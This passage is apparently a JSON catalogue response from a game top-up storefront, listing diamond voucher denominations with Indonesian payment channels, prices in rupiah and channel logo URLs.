0","deal":false},{"id":1786,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":5000.0,"channelVariablePrice":false,"displayPrice":"Rp. 5.000","deal":false}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"19 Diamonds","id":252,"sellerId":50,"voucherId":"diamond_codashopIDR_5500","skuHashId":-1624509378,"sortOrderId":4,"voucherPricePoints":[{"id":1799,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":25,"name":"BOLT","displayName":"Bolt","displayName2":"Bolt","isMno":true,"sortOrder":38,"countryCode":360,"tagline":"Beli pakai pulsa Bolt. Nomor Ponsel \u003d Nomor BOLT! (999xxxxxxx)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BOLT_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1796,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1791,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20346,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":5225.0,"channelVariablePrice":false,"displayPrice":"Rp. 5.225","deal":true},{"id":11489,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":5500.0,"channelVariablePrice":false,"displayPrice":"Rp. 5.500","deal":false},{"id":1800,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":5500.0,"channelVariablePrice":false,"displayPrice":"Rp. 5.500","deal":false},{"id":4152,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":5225.0,"channelVariablePrice":false,"displayPrice":"Rp. 5.225","deal":true},{"id":1801,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":200,"name":"BITX_IDN","displayName":"Bitcoin","displayName2":"BitX IND","isMno":false,"sortOrder":42,"countryCode":360,"tagline":"Bayar dengan Bitcoin","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BITX_IDN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1797,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1793,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":29270,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1792,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":2864,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1795,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20347,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":5225.0,"channelVariablePrice":false,"displayPrice":"Rp. 5.225","deal":true},{"id":9117,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1794,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":224,"name":"SEVELIN","displayName":"7-Eleven (Indonesia)","displayName2":"7-Eleven","isMno":false,"sortOrder":34,"countryCode":360,"tagline":"Bayar di 7-Eleven","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/SEVELIN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1798,"voucherDenominationId":252,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"28 Diamonds","id":191,"sellerId":50,"voucherId":"diamond_codashopIDR_8000","skuHashId":-1624509378,"sortOrderId":5,"voucherPricePoints":[{"id":1298,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":11490,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":8000.0,"channelVariablePrice":false,"displayPrice":"Rp. 8.000","deal":false},{"id":1301,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":10000.0,"channelVariablePrice":false,"displayPrice":"Rp. 10.000","deal":false},{"id":1304,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":25,"name":"BOLT","displayName":"Bolt","displayName2":"Bolt","isMno":true,"sortOrder":38,"countryCode":360,"tagline":"Beli pakai pulsa Bolt. Nomor Ponsel \u003d Nomor BOLT! (999xxxxxxx)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BOLT_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":4153,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":7600.0,"channelVariablePrice":false,"displayPrice":"Rp. 7.600","deal":true},{"id":1306,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":200,"name":"BITX_IDN","displayName":"Bitcoin","displayName2":"BitX IND","isMno":false,"sortOrder":42,"countryCode":360,"tagline":"Bayar dengan Bitcoin","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BITX_IDN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1305,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":8000.0,"channelVariablePrice":false,"displayPrice":"Rp. 8.000","deal":false},{"id":1297,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":29271,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20349,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":7600.0,"channelVariablePrice":false,"displayPrice":"Rp. 7.600","deal":true},{"id":2865,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1299,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":224,"name":"SEVELIN","displayName":"7-Eleven (Indonesia)","displayName2":"7-Eleven","isMno":false,"sortOrder":34,"countryCode":360,"tagline":"Bayar di 7-Eleven","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/SEVELIN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1303,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":10000.0,"channelVariablePrice":false,"displayPrice":"Rp. 10.000","deal":false},{"id":20348,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":7600.0,"channelVariablePrice":false,"displayPrice":"Rp. 7.600","deal":true},{"id":1296,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1302,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":10000.0,"channelVariablePrice":false,"displayPrice":"Rp. 10.000","deal":false},{"id":9118,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1300,"voucherDenominationId":191,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":10000.0,"channelVariablePrice":false,"displayPrice":"Rp. 10.000","deal":false}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"44 Diamonds","id":208,"sellerId":50,"voucherId":"diamond_codashopIDR_12000","skuHashId":-1624509378,"sortOrderId":6,"voucherPricePoints":[{"id":11491,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":12000.0,"channelVariablePrice":false,"displayPrice":"Rp. 12.000","deal":false},{"id":1429,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1435,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":25,"name":"BOLT","displayName":"Bolt","displayName2":"Bolt","isMno":true,"sortOrder":38,"countryCode":360,"tagline":"Beli pakai pulsa Bolt. Nomor Ponsel \u003d Nomor BOLT! (999xxxxxxx)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BOLT_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1437,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":200,"name":"BITX_IDN","displayName":"Bitcoin","displayName2":"BitX IND","isMno":false,"sortOrder":42,"countryCode":360,"tagline":"Bayar dengan Bitcoin","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BITX_IDN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":4154,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":11400.0,"channelVariablePrice":false,"displayPrice":"Rp. 11.400","deal":true},{"id":1431,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":29272,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20350,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":11400.0,"channelVariablePrice":false,"displayPrice":"Rp. 11.400","deal":true},{"id":1433,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1434,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20351,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":11400.0,"channelVariablePrice":false,"displayPrice":"Rp. 11.400","deal":true},{"id":9119,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1428,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1432,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":2866,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1430,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":224,"name":"SEVELIN","displayName":"7-Eleven (Indonesia)","displayName2":"7-Eleven","isMno":false,"sortOrder":34,"countryCode":360,"tagline":"Bayar di 7-Eleven","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/SEVELIN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1427,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1436,"voucherDenominationId":208,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":12000.0,"channelVariablePrice":false,"displayPrice":"Rp. 12.000","deal":false}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"59 Diamonds","id":209,"sellerId":50,"voucherId":"diamond_codashopIDR_16000","skuHashId":-1624509378,"sortOrderId":7,"voucherPricePoints":[{"id":1439,"voucherDenominationId":209,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 